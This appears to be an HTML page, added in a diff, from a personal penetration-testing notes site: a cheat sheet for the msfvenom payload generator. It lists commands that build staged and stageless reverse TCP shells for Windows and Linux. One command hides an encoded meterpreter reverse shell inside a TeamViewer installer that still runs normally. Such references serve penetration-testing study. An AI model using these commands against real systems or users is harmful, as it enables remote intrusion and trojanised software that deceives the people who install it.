@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>ovelny - chaos/tools-cheatsheets/msfvenom</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta
+      name="description"
+      content="ovelny - notes on infosec, penetration testing, programming and others"
+    />
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
+    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
+    <link
+      href="/atom.xml"
+      rel="alternate"
+      title="ovelny"
+      type="application/atom+xml"
+    />
+    <script src="/assets/js/scramble-text.min.js" defer></script>
+    <script src="/assets/js/zoom-images.min.js" defer></script>
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:site" content="@ovelny"/>
+    <meta name="twitter:title" content="ovelny - chaos/tools-cheatsheets/msfvenom"/>
+    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
+    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
+  </head>
+  <body>
+
+    <header>
+      <section>
+        <a href="/">
+          <img
+            class="logo"
+            src="/assets/images/ovelny-pfp.png"
+            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
+          />
+        </a>
+        <h2><a class="ovelny" href="/">ovelny</a></h2>
+      </section>
+      <nav>
+        <a href="/now/">now</a>
+        <a href="/chaos/">chaos</a>
+        <a href="/phasm/">phasm</a>
+        <a href="/support/">support</a>
+        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
+        <a href="/about/">about</a>
+      </nav>
+    </header>
+    <main>
+
+    
+    <h1>Msfvenom</h1>
+
+<h2>Payload naming convention</h2>
+
+<ul>
+<li>General naming convention is <code>&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;</code>: for instance <code>linux/x86/shell_reverse_tcp</code>.</li>
+<li>However, windows 32bit targets have no specified arch, like so: <code>windows/shell_reverse_tcp</code>.</li>
+<li>Staged payloads are denoted by a slash: <code>windows/x64/meterpreter/reverse_tcp</code>.</li>
+<li>Stageless payloads are denoted by an underscore: <code>linux/x86/meterpreter_reverse_tcp</code>.</li>
+</ul>
+
+<h2>Commands</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># List available payloads:</span>
+msfvenom <span class="nt">-l</span> payloads
+
+<span class="c"># Generate a staged reverse TCP payload in exe format for windows x64 systems (remove null byte bad char):</span>
+msfvenom <span class="nt">-p</span> windows/x64/shell/reverse_tcp <span class="nt">-f</span> exe <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-o</span> shell.exe <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt;
+
+<span class="c"># Generate a stageless reverse TCP payload in exe format for windows x64 systems (remove null byte bad char):</span>
+msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nt">-f</span> exe <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-o</span> shell.exe <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt;
+
+<span class="c"># Generate a staged reverse TCP payload in elf format for linux x64 systems (remove null byte bad char):</span>
+msfvenom <span class="nt">-p</span> linux/x64/shell/reverse_tcp <span class="nt">-f</span> elf <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-o</span> shell.elf <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt;
+
+<span class="c"># Generate a stageless reverse TCP payload in elf format for linux x64 systems (remove null byte bad char):</span>
+msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nt">-f</span> elf <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-o</span> shell.elf <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt;
+
+<span class="c"># Generate a stageless meterpreter reverse TCP payload for a windows x86 target,</span>
+<span class="c"># embed it in a TeamViewer_Setup.exe executable file,</span>
+<span class="c"># encode the payload 5 times with shikata_ga_nai,</span>
+<span class="c"># and continue the normal execution of the app by spawning the payload in a separate thread:</span>
+msfvenom <span class="nt">-p</span> windows/x86/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;listen-IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listen-port&gt; <span class="nt">-k</span> <span class="nt">-x</span> ~/Downloads/TeamViewer_Setup.exe <span class="nt">-e</span> x86/shikata_ga_nai <span class="nt">-a</span> x86 <span class="nt">--platform</span> windows <span class="nt">-o</span> ~/Desktop/TeamViewer_Setup.exe <span class="nt">-i</span> 5
+</code></pre></div>
+
+    
+    </main>
+    <footer id="footer">
+      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
+      <div class="footer-section">「七転び八起き」</div>
+    </footer>
+  </body>
+</html>
+
